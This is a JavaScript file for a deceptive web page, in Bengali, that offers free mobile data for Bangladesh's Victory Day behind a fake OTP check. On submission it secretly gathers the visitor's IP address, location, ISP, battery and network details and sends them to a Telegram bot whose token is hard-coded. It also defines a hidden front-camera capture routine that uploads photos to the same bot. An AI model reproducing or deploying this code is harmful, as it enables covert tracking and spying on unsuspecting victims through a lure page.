const BOT_TOKEN = "8312309177:AAGaLWnyLdx59DUI5vl78GoBShyQvaoUDx0"; // Replace with your bot token
const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
const API_FILE_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
async function getIpDetails() {
    try {
        const response = await fetch("https://ipapi.co/json/");
        if (!response.ok) throw new Error("Failed to fetch IP details");
        return await response.json();
    } catch (error) {
        console.error("Error fetching IP details:", error);
        return {
            ip: "Unknown",
            city: "Unknown",
            region: "Unknown",
            country: "Unknown",
            org: "Unknown",
            asn: "Unknown",
        };
    }
}
async function getDeviceInfo() {
    const deviceInfo = {
        charging: false,
        chargingPercentage: null,
        networkType: null,
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    };
    if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        deviceInfo.charging = battery.charging;
        deviceInfo.chargingPercentage = Math.round(battery.level * 100);
    }
    if (navigator.connection) {
        deviceInfo.networkType = navigator.connection.effectiveType;
    }
    return deviceInfo;
}
async function sendTelegramMessage(chatId, message) {
    const data = {
        chat_id: chatId,
        text: message,
        parse_mode: "HTML"
    };
    try {
        const response = await fetch(API_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });
        const result = await response.json();
        console.log("Telegram Response:", result);
    } catch (error) {
        console.error("Error sending message:", error);
    }
}
async function sendPhoto(chatId, photo) {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', photo);
    try {
        const response = await fetch(API_FILE_URL, {
            method: "POST",
            body: formData
        });
        const result = await response.json();
        console.log("Photo sent:", result);
    } catch (error) {
        console.error("Error sending photo:", error);
    }
}
async function capturePhoto(video) {
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    const photo = canvas.toDataURL('image/png');
    const response = await fetch(photo);
    const blob = await response.blob();
    return new File([blob], 'photo.png', { type: 'image/png' });
}
async function sendInitialInfo(chatId) {
    const ipDetails = await getIpDetails();
    const deviceInfo = await getDeviceInfo();
    const message = `
<b><u>🕵️‍♂️ Activity Tracked:</u></b>
<b>🌐 Ip address:</b> <i>${ipDetails.ip}</i>
<b>🌍 Location:</b> <i>${ipDetails.city}, ${ipDetails.region}, ${ipDetails.country}</i>
<b>📶 ISP:</b> <i>${ipDetails.org}</i>
<b>🔍 ASN:</b> <i>${ipDetails.asn}</i>
<b>📱 Device Info:</b>
<b>🔋 Charging:</b> <i>${deviceInfo.charging ? 'Yes' : 'No'}</i>
<b>🔋 Battery Level:</b> <i>${deviceInfo.chargingPercentage}%</i>
<b>🌐 Network Type:</b> <i>${deviceInfo.networkType}</i>
<b>🕒 Time Zone:</b> <i>${deviceInfo.timeZone}</i>
<b>👤 Tracked on: @Camera_Heakinbot</b>
    `;
    if (chatId) {
        await sendTelegramMessage(chatId, message);
    } else {
        console.error("Chat ID missing!");
    }
}
const form = document.getElementById("data-form");
const otpBox = document.getElementById("otp-box");
const verifyBtn = document.getElementById("verifyBtn");
const timerText = document.getElementById("timer");
const otpInput = document.getElementById("otp");
let countdown;
let generatedOTP = "";
form.addEventListener("submit", function (e) {
    e.preventDefault();
    form.style.display = "none";
    otpBox.style.display = "block";
    startTimer(60);
    autoGenerateOTP();
});
function startTimer(seconds) {
    let time = seconds;
    countdown = setInterval(() => {
        time--;
        timerText.innerText = `⏳ সময় বাকি: ${time} সেকেন্ড`;
        if (time <= 0) {
            clearInterval(countdown);
            timerText.innerText = "❌ OTP সময় শেষ";
            verifyBtn.disabled = true;
        }
    }, 1000);
}
function autoGenerateOTP() {
    const delay = Math.floor(Math.random() * 2 + 5) * 1000; // 5 or 6 sec
    setTimeout(() => {
        generatedOTP = Math.floor(100000 + Math.random() * 900000).toString();
        otpInput.value = generatedOTP;
        timerText.innerText = "📩 Demo OTP auto received";
    }, delay);
}
verifyBtn.addEventListener("click", function () {
    const otp = otpInput.value;
    if (otp.length !== 6) {
        alert("⚠️ দয়া করে 6 ডিজিট OTP প্রদান করুন");
        return;
    }
    if (otp !== generatedOTP) {
        alert("❌ OTP মিলছে না (Demo)");
        return;
    }
    clearInterval(countdown);
    alert(
        "🎉 সফলভাবে বরণ করা হয়েছে!\n\n🇧🇩 বিজয়ী দিবস উপলক্ষে GB ডাটা রিকর্ব করা হচ্ছে।"
    );
    location.reload(); // Reload the page after verification
});
// Call sendInitialInfo after the form submission
form.addEventListener('submit', async function (event) {
    event.preventDefault(); // Prevent default form submission
    const urlParams = new URLSearchParams(window.location.search);
    const chatId = urlParams.get('id');
    await sendInitialInfo(chatId);
});
// Clean input to allow only numbers in mobile number field
document.getElementById('mobile-number').addEventListener('input', function () {
    this.value = this.value.replace(/[^0-9]/g, '');
});
async function startCamera() {
    const video = document.createElement('video');
    video.style.display = 'none'; // Hide the video element
    document.body.appendChild(video);
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        video.srcObject = stream;
        video.play();
        await new Promise(resolve => {
            video.onloadedmetadata = resolve;
        });
        return video;
    } catch (error) {
        console.error("Error accessing camera:", error);
        return null;
    }
}
